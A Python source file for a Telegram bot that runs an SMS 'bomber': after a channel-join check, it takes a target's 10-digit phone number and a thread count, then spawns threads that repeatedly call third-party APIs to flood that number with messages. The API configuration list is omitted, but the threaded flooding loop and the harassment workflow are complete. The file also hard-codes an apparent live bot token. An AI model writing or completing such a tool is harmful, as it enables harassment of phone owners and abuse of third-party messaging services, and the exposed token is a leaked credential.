import logging
import asyncio
import requests
import time
import threading
import json
import math
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)

BOT_TOKEN = "7714765260:AAG4yiN5_ow25-feUeKslR2xsdeMFuPllGg"
CHANNEL_ID = -1002512368825  # Replace with your actual channel ID

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Global counters for the bomber
message_count = 0
api_counters = {}
api_repeats = {}  # Tracks how many times each API has repeated
count_lock = threading.Lock()
start_time = 0
bomber_active = False

# [Keep all your API configurations here...]

def api_request_loop(api_config, number, thread_id=None):
    global message_count, api_counters, api_repeats, bomber_active
    api_name = api_config['name']
    
    with count_lock:
        if api_name not in api_counters:
            api_counters[api_name] = 0
            api_repeats[api_name] = 0
    
    while bomber_active:
        try:
            if api_config['method'] == 'POST':
                response = requests.post(
                    api_config['url'],
                    data=api_config['data'](number),
                    headers=api_config.get('headers', {}),
                    timeout=10
                )
            else:
                response = requests.get(
                    api_config['url'],
                    params=api_config['params'](number),
                    headers=api_config.get('headers', {}),
                    timeout=10
                )
            
            with count_lock:
                message_count += 1
                api_counters[api_name] += 1
                # Increment repeat counter when count crosses 100
                if api_counters[api_name] % 100 == 0:
                    api_repeats[api_name] += 1
                
        except Exception as e:
            pass
        
        time.sleep(api_config['interval'])

def start_bomber(number, boom_threads):
    global bomber_active, start_time, message_count, api_counters, api_repeats
    
    # Reset counters
    bomber_active = True
    start_time = time.time()
    message_count = 0
    api_counters = {}
    api_repeats = {}
    
    # Start display thread
    display_thread = threading.Thread(target=display_counters, daemon=True)
    display_thread.start()
    
    # Start API threads
    for config in api_configurations:
        threads = boom_threads if config['threads'] == 'user_defined' else config['threads']
        for i in range(threads):
            t = threading.Thread(
                target=api_request_loop,
                args=(config, number, i+1),
                daemon=True
            )
            t.start()

def stop_bomber():
    global bomber_active
    bomber_active = False

def display_counters():
    global message_count, api_counters, api_repeats, start_time, bomber_active
    while bomber_active:
        with count_lock:
            current_total = message_count
            current_api_counts = api_counters.copy()
            current_repeats = api_repeats.copy()
        
        runtime = time.time() - start_time
        output = f"📊 TOTAL REQUESTS: {current_total:,} ({current_total/max(1,runtime):.1f}/sec)\n"
        output += f"⏱️ Runtime: {runtime:.1f}s\n\n"
        output += "🔹 ACTIVE API THREADS:\n"
        
        for api_name in sorted(current_api_counts.keys()):
            count = current_api_counts[api_name]
            repeat = current_repeats.get(api_name, 0)
            output += f"  {api_name.ljust(20)}: {count:,} (Repeat: {repeat})\n"
        
        print(output)
        time.sleep(5)

# /start handler
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Join Channel", url="https://t.me/+RhlQLyOfQ48xMjI1")],
        [InlineKeyboardButton("Check Join", callback_data="check_join")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_photo(
        photo="https://t.me/bshshsubjsus/4",
        caption="Welcome! Please join the channel to continue.",
        reply_markup=reply_markup
    )

# Button press handler
async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            # User has joined, show bomber button
            keyboard = [[InlineKeyboardButton("🚀 Start Bomber", callback_data="start_bomber")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_caption(
                caption="✅ You have joined the channel. Click below to start the bomber!",
                reply_markup=reply_markup
            )
        else:
            await query.edit_message_caption(caption="❌ You haven't joined the channel yet.")
    except Exception as e:
        logging.error(f"Error checking channel membership: {e}")
        await query.edit_message_caption(caption="⚠️ Error checking your join status.")

# Start bomber handler
async def start_bomber_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    # Ask for phone number
    await query.edit_message_caption(
        caption="Please send the target phone number (without +91 or 0):"
    )
    
    # Store the state that we're waiting for a phone number
    context.user_data['awaiting_phone_number'] = True

# Handle phone number input
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'awaiting_phone_number' in context.user_data and context.user_data['awaiting_phone_number']:
        phone_number = update.message.text
        
        # Validate phone number
        if not phone_number.isdigit() or len(phone_number) != 10:
            await update.message.reply_text("Invalid phone number. Please send a 10-digit number (without +91 or 0).")
            return
        
        # Ask for number of threads
        await update.message.reply_text(
            "How many threads for the Booming API? (1-20 recommended):",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("5", callback_data=f"threads_5_{phone_number}")],
                [InlineKeyboardButton("10", callback_data=f"threads_10_{phone_number}")],
                [InlineKeyboardButton("15", callback_data=f"threads_15_{phone_number}")],
                [InlineKeyboardButton("20", callback_data=f"threads_20_{phone_number}")]
            ])
        )
        
        # Clear the state
        context.user_data['awaiting_phone_number'] = False

# Handle thread selection
async def handle_thread_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    # Parse the callback data
    data = query.data.split('_')
    threads = int(data[1])
    phone_number = data[2]
    
    # Start the bomber
    start_bomber(phone_number, threads)
    
    # Send confirmation
    await query.edit_message_text(
        f"🚀 Bomber started on {phone_number} with {threads} threads!\n\n"
        "The attack is running in the background. To stop, use /stopbomber."
    )

# Stop bomber command
async def stop_bomber_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    stop_bomber()
    await update.message.reply_text("🛑 Bomber stopped successfully!")

# Main function
async def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stopbomber", stop_bomber_command))
    app.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
    app.add_handler(CallbackQueryHandler(start_bomber_handler, pattern="start_bomber"))
    app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="^threads_"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    logging.info("Bot is running...")
    await app.run_polling()

# Run the bot
if __name__ == '__main__':
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main())
